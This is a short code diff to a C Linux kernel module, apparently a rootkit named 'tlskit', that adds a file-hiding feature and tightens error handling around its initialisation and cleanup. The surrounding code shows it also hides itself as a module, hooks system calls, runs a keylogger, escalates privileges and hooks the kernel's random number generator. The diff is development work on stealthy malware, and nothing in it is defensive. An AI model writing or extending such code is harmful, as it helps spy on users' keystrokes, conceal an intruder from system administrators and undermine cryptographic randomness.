@@ -11,6 +11,7 @@
 #include "priv_escalation.h"
 #include "keylogger.h"
 #include "csprng.h"
+#include "file_hiding.h"
 
 static int cleanup(void *_data) {
 
@@ -19,6 +20,9 @@ static int cleanup(void *_data) {
 
     /* Stop key logger */
     disable_key_logger();
+
+    /* Disable file hiding */
+    disable_file_hiding();
 
     /* Remove syscall hooks */
     disable_syscall_hooking();
@@ -117,12 +121,19 @@ static int __init tlskit_init(void) {
         goto syscall_hooking_failed;
     }
 
+    enable_file_hiding();
+
     init_key_logger();
 
-    enable_csprng_hook();
+    if (0 != enable_csprng_hook()) {
+        goto csprng_failed;
+    }
 
     return 0;
 
+csprng_failed:
+    disable_file_hiding();
+    disable_syscall_hooking();
 syscall_hooking_failed:
 module_hiding_failed:
 
